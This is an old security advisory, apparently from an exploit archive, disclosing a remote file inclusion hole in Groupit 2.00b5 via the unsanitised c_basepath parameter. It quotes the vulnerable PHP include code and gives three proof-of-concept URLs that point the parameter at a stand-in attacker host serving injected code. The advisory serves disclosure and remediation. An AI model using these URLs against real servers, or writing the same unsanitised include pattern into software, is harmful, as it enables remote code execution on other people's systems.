@@ -1,0 +1,97 @@
+-------------------------------------------------------------------------------------
+[ECHO_ADV_75$2007] Groupit 2.00b5 (c_basepath) Remote File Inclusion Vulnerability
+-------------------------------------- ----------------------------------------------
+
+Author          : Dedi Dwianto a.k.a the_day
+Date Found      : March, 15th 2007
+Location        : Indonesia, Jakarta
+web             : http://advisories.echo.or.id/adv/adv75-theday-2007.txt
+Critical Lvl    : Highly critical
+Impact          : System access
+Where           : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application     : Groupit
+version         : 2.00b5
+URL             : http://fresh.t-systems-sfr.com/fresh/unix/src/privat2/groupit-2.00b5.tar.gz
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~
+
+- Invalid include function at html/content.php
+-----------------------html/content.php------------
+
+<?
+...
+include "$c_basepath/base/groupit.start.inc";
+
+if (!empty($c_is_search))
+{
+  include "$c_basepath/modules/search/main.inc";
+} else
+{
+  if ($c_is_section)
+  {
+     include  "$c_basepath/modules/content/section.inc";
+  } else
+  .........
+
+include "$c_basepath/base/groupit.stop.inc";
+?>
+----------------------------------------------------------
+
+Input passed to the "$c_basepath" parameter in load.inc.php is not
+properly verified before being used. This can be exploited to execute
+arbitrary PHP code by including files from local or external
+resources.
+
+also affected files :
+
+html/userprofile.php
+html/password.php
+html/dispatch.php
+html/deliver.php
+
+and More ....
+
+
+
+Proof Of Concept:
+~~~~~~~~~~~
+
+http://localhost/groupit/html/content.php?c_basepath=http://atacker.com/inject.txt?
+http://localhost/groupit/html/userprofile.php?c_basepath=http://atacker.com/inject.txt?
+http://localhost/groupit/html/password.php?c_basepath=http://atacker.com/inject.txt?
+
+Solution:
+~~~
+
+- Sanitize variable $c_basepath affected files.
+- Turn off register_globals
+
+---------------------------------------------------------------------------
+
+Shoutz:
+~
+~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous
+~ Jessy Nice Girl
+~ az001,bomm_3x,matdhule
+~ newbie_hacker@yahoogroups.com
+~ #aikmel - #e-c-h-o @irc.dal.net
+------------------------------------------------------------------------
+---
+Contact:
+~
+    EcHo Research & Development Center
+    http://advisories.echo.or.id
+    erdc[at]echo[dot]or[dot]id
+    the_day[at]echo[dot]or[dot]id
+
+-------------------------------- [ EOF ]----------------------------------
+
+# milw0rm.com [2007-03-15]
